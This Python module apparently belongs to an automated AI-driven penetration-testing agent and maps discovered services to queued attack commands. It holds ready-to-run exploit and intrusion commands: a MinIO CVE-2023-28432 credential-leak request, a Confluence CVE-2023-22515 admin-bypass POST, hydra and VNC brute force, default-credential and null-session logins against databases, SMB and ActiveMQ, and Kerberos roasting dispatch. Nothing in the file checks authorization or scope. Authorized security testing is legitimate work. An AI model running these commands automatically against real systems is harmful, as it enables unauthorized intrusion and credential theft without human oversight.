"""
agents/finding_triggers.py — findings-driven action triggers.

Why this exists
===============
The old subagent dispatcher ran a FIXED set of subagents per phase,
regardless of what was actually found.  Recon always ran
network_scan + dns_recon + service_banner + 2× web_fingerprint —
even when the target turned out to be an obscure service that none
of those subagents understood.

A real pentester adapts based on what they see.  When `nmap` reports
``54321/tcp open Golang net/http server`` with response body containing
``"minio"``, the operator immediately tries the MinIO CVE-2023-28432
bootstrap-verify endpoint.  When they see ``WordPress 6.x``, they run
wpscan.  When they see ``Tomcat /manager``, they try default creds.

This module is the declarative layer that encodes those reactions.
Patterns matched against intel → actions queued onto the engagement.

Two action types are supported:
  1. ``command`` — a shell command (added to intel["next_commands"]
     for the exploit-phase first-strike loop to consume).
  2. ``subagent`` — a subagent name to dispatch with target+intel.

The trigger registry is intentionally OPEN: anyone can register a new
trigger.  The default set below covers the 30 most common
attack-surface→action mappings.
"""
from __future__ import annotations

import re
from dataclasses import dataclass, field
from typing import Any, Callable, Dict, List, Optional


# ─────────────────────────────────────────────────────────────────────
#  Trigger definition
# ─────────────────────────────────────────────────────────────────────


@dataclass
class TriggerAction:
    """One concrete action a trigger may emit."""
    kind:       str                # "command" | "subagent" | "insight"
    payload:    str                # shell command, subagent name, or insight text
    priority:   int    = 5         # 0 (low) ... 10 (must-do)
    rationale:  str    = ""        # why this action — fed into LLM prompt
    cves:       List[str] = field(default_factory=list)


@dataclass
class Trigger:
    """A declarative "if condition matches, queue these actions" rule.

    Conditions are evaluated against the engagement context.
    """
    name:    str
    when:    Callable[["EngagementContext"], bool]
    actions: List[TriggerAction]
    once:    bool = True           # fire at most once per engagement


# ─────────────────────────────────────────────────────────────────────
#  Predicate helpers
# ─────────────────────────────────────────────────────────────────────


def _service_matches(ctx, *, port: Optional[int] = None,
                     product_re: Optional[str] = None,
                     banner_re: Optional[str] = None) -> bool:
    """Return True if any discovered service matches the filters.

    ``services`` is {port: {service, version, product, banner, ...}}.
    """
    services = ctx.services
    if not services:
        return False
    for p, svc in services.items():
        if not isinstance(svc, dict):
            continue
        if port is not None and int(p) != int(port):
            continue
        haystack = " ".join(str(svc.get(k, "")) for k in
                            ("service", "product", "version", "banner",
                              "extrainfo", "info")).lower()
        if product_re and not re.search(product_re, haystack, re.IGNORECASE):
            continue
        if banner_re and not re.search(banner_re, haystack, re.IGNORECASE):
            continue
        return True
    return False


def _port_open(ctx, port: int) -> bool:
    ports = ctx.open_ports or []
    return any(int(p) == int(port) for p in ports if str(p).isdigit())


def _intel_has(ctx, key: str) -> bool:
    return bool(ctx.intel.get(key))


def _target_host(ctx) -> str:
    """Extract a hostname / IP we can interpolate into commands."""
    return (ctx.intel.get("target_host") or
            ctx.intel.get("target_url") or
            ctx.target or "TARGET")


# ─────────────────────────────────────────────────────────────────────
#  Default trigger registry
# ─────────────────────────────────────────────────────────────────────


def _build_default_triggers() -> List[Trigger]:
    """The 30+ common attack-surface→action mappings.

    Each `when` is closure-captured so adding new triggers requires
    only appending a Trigger() row.  Patterns are tuned conservatively:
    fire on STRONG positive matches, not on guesses.
    """
    triggers: List[Trigger] = []
    T = TriggerAction          # alias for brevity

    # ── MinIO — the kill chain from your failed run ──
    triggers.append(Trigger(
        name="minio_bootstrap_verify",
        when=lambda ctx: _service_matches(ctx, banner_re=r"minio"),
        actions=[
            T(kind="command", priority=10,
              payload="curl -sk -X POST http://{host}/minio/bootstrap/v1/verify",
              rationale="MinIO CVE-2023-28432 — unauthenticated info disclosure leaks MINIO_ROOT_USER/PASSWORD",
              cves=["CVE-2023-28432"]),
            T(kind="insight", priority=9, payload="MinIO instance detected — CVE-2023-28432 is a trivial first-strike. Bootstrap-verify endpoint commonly leaks admin credentials."),
        ],
    ))

    # ── WordPress ──
    triggers.append(Trigger(
        name="wordpress_full_enum",
        when=lambda ctx: _service_matches(ctx, banner_re=r"wordpress|wp-content|wp-login"),
        actions=[
            T(kind="command", priority=8,
              payload="wpscan --url http://{host} --enumerate u,p,t --random-user-agent",
              rationale="WordPress detected — enumerate users, plugins, themes for known-vuln chains"),
        ],
    ))

    # ── Tomcat /manager ──
    triggers.append(Trigger(
        name="tomcat_manager_default_creds",
        when=lambda ctx: _service_matches(ctx, banner_re=r"tomcat|coyote"),
        actions=[
            T(kind="command", priority=8,
              payload="hydra -L /usr/share/seclists/Usernames/Common-Credentials/best110.txt "
                       "-P /usr/share/seclists/Passwords/Common-Credentials/best110.txt "
                       "{host} http-get /manager/html",
              rationale="Tomcat detected — test default creds (tomcat:tomcat, admin:admin) on /manager/html"),
            T(kind="command", priority=7,
              payload="curl -sk http://{host}/manager/html -I",
              rationale="Check /manager/html accessibility (common default-cred chain to JSP RCE)"),
        ],
    ))

    # ── Jenkins ──
    triggers.append(Trigger(
        name="jenkins_script_console",
        when=lambda ctx: _service_matches(ctx, banner_re=r"jenkins"),
        actions=[
            T(kind="command", priority=9,
              payload="curl -sk http://{host}/script -I",
              rationale="Jenkins detected — /script console can yield Groovy RCE if unauthenticated"),
            T(kind="command", priority=8,
              payload="curl -sk http://{host}/asynchPeople/api/json",
              rationale="Jenkins user enumeration via asynchPeople endpoint"),
        ],
    ))

    # ── Confluence ──
    triggers.append(Trigger(
        name="confluence_cve_chain",
        when=lambda ctx: _service_matches(ctx, banner_re=r"confluence|atlassian"),
        actions=[
            T(kind="insight", priority=10, payload="Confluence detected — check CVE-2023-22515 (broken access control, admin creation) and CVE-2022-26134 (OGNL RCE)"),
            T(kind="command", priority=9,
              payload="curl -sk -X POST http://{host}/server-info.action --data 'bootstrapStatusProvider.applicationConfig.setupComplete=false'",
              rationale="CVE-2023-22515 probe — bypass admin-creation lockout",
              cves=["CVE-2023-22515"]),
        ],
    ))

    # ── GitLab ──
    triggers.append(Trigger(
        name="gitlab_recon",
        when=lambda ctx: _service_matches(ctx, banner_re=r"gitlab"),
        actions=[
            T(kind="command", priority=8,
              payload="curl -sk http://{host}/explore/projects",
              rationale="GitLab detected — check public projects + version-specific CVEs"),
            T(kind="command", priority=7,
              payload="curl -sk http://{host}/api/v4/projects?per_page=100",
              rationale="GitLab API project enumeration"),
        ],
    ))

    # ── SMB ──
    triggers.append(Trigger(
        name="smb_full_enum",
        when=lambda ctx: _service_matches(ctx, port=445) or _port_open(ctx, 445),
        actions=[
            T(kind="command", priority=8,
              payload="enum4linux-ng -A {host}",
              rationale="SMB/445 open — enum4linux-ng for shares, users, groups, OS info"),
            T(kind="command", priority=8,
              payload="smbclient -L //{host}/ -N",
              rationale="Anonymous SMB share listing"),
            T(kind="command", priority=7,
              payload="crackmapexec smb {host} --shares -u '' -p ''",
              rationale="Null-session share enumeration via crackmapexec"),
        ],
    ))

    # ── LDAP (often Domain Controllers) ──
    triggers.append(Trigger(
        name="ldap_anon_bind",
        when=lambda ctx: _service_matches(ctx, port=389) or _port_open(ctx, 389),
        actions=[
            T(kind="command", priority=8,
              payload="ldapsearch -x -h {host} -s base -b '' '(objectclass=*)' '*' '+'",
              rationale="LDAP/389 open — anonymous RootDSE query for naming contexts + supported SASL mechanisms"),
        ],
    ))

    # ── Kerberos (DC indicator) ──
    triggers.append(Trigger(
        name="kerberos_dc_attacks",
        when=lambda ctx: _port_open(ctx, 88) or _service_matches(ctx, port=88),
        actions=[
            T(kind="insight", priority=9, payload="Kerberos/88 open — likely Active Directory DC. AS-REP roastable users + Kerberoastable SPNs are the high-value first targets."),
            T(kind="subagent", priority=9, payload="lateral.ad_recon",
              rationale="Dispatch AD recon subagent: kerbrute userenum, GetNPUsers AS-REP roast, BloodHound collection"),
        ],
    ))

    # ── MSSQL ──
    triggers.append(Trigger(
        name="mssql_default_creds",
        when=lambda ctx: _port_open(ctx, 1433) or _service_matches(ctx, banner_re=r"microsoft sql server|mssql"),
        actions=[
            T(kind="command", priority=7,
              payload="crackmapexec mssql {host} -u sa -p '' --port 1433",
              rationale="MSSQL/1433 — test default sa account with blank password"),
            T(kind="command", priority=6,
              payload="impacket-mssqlclient -windows-auth Administrator@{host}",
              rationale="MSSQL with Windows auth probe"),
        ],
    ))

    # ── MySQL ──
    triggers.append(Trigger(
        name="mysql_default_creds",
        when=lambda ctx: _port_open(ctx, 3306) or _service_matches(ctx, banner_re=r"mysql|mariadb"),
        actions=[
            T(kind="command", priority=6,
              payload="mysql -h {host} -u root --password='' -e 'SELECT VERSION();'",
              rationale="MySQL/3306 — test passwordless root (common dev misconfig)"),
        ],
    ))

    # ── PostgreSQL ──
    triggers.append(Trigger(
        name="postgres_default_creds",
        when=lambda ctx: _port_open(ctx, 5432) or _service_matches(ctx, banner_re=r"postgresql"),
        actions=[
            T(kind="command", priority=6,
              payload="psql -h {host} -U postgres -c 'SELECT version();'",
              rationale="Postgres/5432 — test default postgres role with no password"),
        ],
    ))

    # ── Redis (often unauthenticated) ──
    triggers.append(Trigger(
        name="redis_unauth",
        when=lambda ctx: _port_open(ctx, 6379) or _service_matches(ctx, banner_re=r"redis"),
        actions=[
            T(kind="command", priority=9,
              payload="redis-cli -h {host} info",
              rationale="Redis/6379 — test unauthenticated access. If INFO works, SSH-key write to authorized_keys is the canonical chain"),
        ],
    ))

    # ── MongoDB (often unauthenticated) ──
    triggers.append(Trigger(
        name="mongodb_unauth",
        when=lambda ctx: _port_open(ctx, 27017) or _service_matches(ctx, banner_re=r"mongodb"),
        actions=[
            T(kind="command", priority=8,
              payload="mongo --host {host} --eval 'db.adminCommand({listDatabases: 1})'",
              rationale="MongoDB/27017 — test unauthenticated database listing"),
        ],
    ))

    # ── Elasticsearch (data exposure) ──
    triggers.append(Trigger(
        name="elasticsearch_unauth",
        when=lambda ctx: _port_open(ctx, 9200) or _service_matches(ctx, banner_re=r"elasticsearch"),
        actions=[
            T(kind="command", priority=8,
              payload="curl -sk http://{host}:9200/_cat/indices?v",
              rationale="Elasticsearch/9200 — list indices (often exposed without auth)"),
        ],
    ))

    # ── FTP anonymous ──
    triggers.append(Trigger(
        name="ftp_anon",
        when=lambda ctx: _port_open(ctx, 21) or _service_matches(ctx, banner_re=r"ftp"),
        actions=[
            T(kind="command", priority=6,
              payload="curl -sk ftp://anonymous:anonymous@{host}/",
              rationale="FTP/21 — anonymous login attempt"),
        ],
    ))

    # ── NFS ──
    triggers.append(Trigger(
        name="nfs_shares",
        when=lambda ctx: _port_open(ctx, 2049),
        actions=[
            T(kind="command", priority=7,
              payload="showmount -e {host}",
              rationale="NFS/2049 — list exports (often world-readable in misconfigs)"),
        ],
    ))

    # ── SNMP ──
    triggers.append(Trigger(
        name="snmp_default_community",
        when=lambda ctx: _port_open(ctx, 161),
        actions=[
            T(kind="command", priority=6,
              payload="snmpwalk -v2c -c public {host} 1.3.6.1.2.1.1",
              rationale="SNMP/161 — try 'public' community string (very common default)"),
        ],
    ))

    # ── Docker API ──
    triggers.append(Trigger(
        name="docker_api_exposed",
        when=lambda ctx: _port_open(ctx, 2375) or _port_open(ctx, 2376),
        actions=[
            T(kind="command", priority=10,
              payload="curl -sk http://{host}:2375/version",
              rationale="Docker API/2375 exposed — if reachable, container escape to host is trivial"),
        ],
    ))

    # ── Kubernetes API ──
    triggers.append(Trigger(
        name="k8s_api_anon",
        when=lambda ctx: _port_open(ctx, 6443) or _port_open(ctx, 8080),
        actions=[
            T(kind="command", priority=8,
              payload="curl -sk https://{host}:6443/api/v1/namespaces",
              rationale="K8s API server — test anonymous access to /api/v1"),
        ],
    ))

    # ── ActiveMQ ──
    triggers.append(Trigger(
        name="activemq_default",
        when=lambda ctx: _port_open(ctx, 8161) or _service_matches(ctx, banner_re=r"activemq"),
        actions=[
            T(kind="command", priority=8,
              payload="curl -sk -u admin:admin http://{host}:8161/admin/",
              rationale="ActiveMQ default creds — admin:admin on /admin (CVE-2023-46604 if version old)"),
        ],
    ))

    # ── Rsync ──
    triggers.append(Trigger(
        name="rsync_modules",
        when=lambda ctx: _port_open(ctx, 873),
        actions=[
            T(kind="command", priority=6,
              payload="rsync rsync://{host}/",
              rationale="Rsync/873 — list available modules (sometimes world-readable)"),
        ],
    ))

    # ── VNC ──
    triggers.append(Trigger(
        name="vnc_noauth",
        when=lambda ctx: _port_open(ctx, 5900) or _port_open(ctx, 5901),
        actions=[
            T(kind="command", priority=7,
              payload="nmap -p 5900 --script vnc-info,vnc-brute {host}",
              rationale="VNC/5900 — auth method check + brute (no-auth instances are surprisingly common)"),
        ],
    ))

    # ── RDP ──
    triggers.append(Trigger(
        name="rdp_recon",
        when=lambda ctx: _port_open(ctx, 3389),
        actions=[
            T(kind="command", priority=7,
              payload="nmap -p 3389 --script rdp-enum-encryption,rdp-ntlm-info {host}",
              rationale="RDP/3389 — NLA check + NTLM info leak"),
        ],
    ))

    # ── DNS zone transfer ──
    triggers.append(Trigger(
        name="dns_zone_xfer",
        when=lambda ctx: _port_open(ctx, 53),
        actions=[
            T(kind="command", priority=7,
              payload="dig axfr @{host}",
              rationale="DNS/53 — attempt AXFR zone transfer (often misconfigured to allow it)"),
        ],
    ))

    # ── Default credentials cluster (catch-all for common defaults) ──
    triggers.append(Trigger(
        name="exposed_admin_panel_default_creds",
        when=lambda ctx: any(("admin" in (p or "").lower() or "login" in (p or "").lower())
                              for p in (ctx.intel.get("web_paths") or [])),
        actions=[
            T(kind="insight", priority=7, payload="Admin panel paths discovered — test default credentials (admin/admin, admin/password, root/root, administrator/password) BEFORE running brute-force"),
        ],
    ))

    return triggers


# Singleton registry — extend at module import time if needed
_TRIGGERS: List[Trigger] = _build_default_triggers()
_FIRED: Dict[str, bool] = {}


def register_trigger(trigger: Trigger) -> None:
    """Append a new trigger (for plugins / per-engagement extensions)."""
    _TRIGGERS.append(trigger)


def evaluate_triggers(ctx) -> List[TriggerAction]:
    """Walk every registered trigger; return a list of TriggerActions
    whose conditions evaluated True (and have not yet fired if once=True).

    Side effect: ``_FIRED`` marks once-only triggers as consumed.  The
    caller is expected to convert TriggerActions into next_commands /
    pinned insights / subagent dispatches as appropriate.

    The session_id is used as the fire-key so multiple parallel sessions
    don't interfere with each other.
    """
    out: List[TriggerAction] = []
    sid = getattr(ctx, "session_id", "default")
    for t in _TRIGGERS:
        fire_key = f"{sid}::{t.name}"
        if t.once and _FIRED.get(fire_key):
            continue
        try:
            if not t.when(ctx):
                continue
        except Exception:
            continue
        host = _target_host(ctx)
        for raw in t.actions:
            # Interpolate {host} placeholder in command payloads
            payload = raw.payload.replace("{host}", host) if raw.kind == "command" else raw.payload
            out.append(TriggerAction(
                kind=raw.kind, payload=payload,
                priority=raw.priority, rationale=raw.rationale,
                cves=list(raw.cves),
            ))
        if t.once:
            _FIRED[fire_key] = True
    # Sort by priority descending (most important first)
    out.sort(key=lambda a: a.priority, reverse=True)
    return out


def reset_fired(session_id: str = "") -> None:
    """Clear the fired-trigger memory for a given session (or all)."""
    if not session_id:
        _FIRED.clear()
        return
    for k in [k for k in _FIRED if k.startswith(f"{session_id}::")]:
        del _FIRED[k]


__all__ = ["Trigger", "TriggerAction", "register_trigger",
            "evaluate_triggers", "reset_fired"]
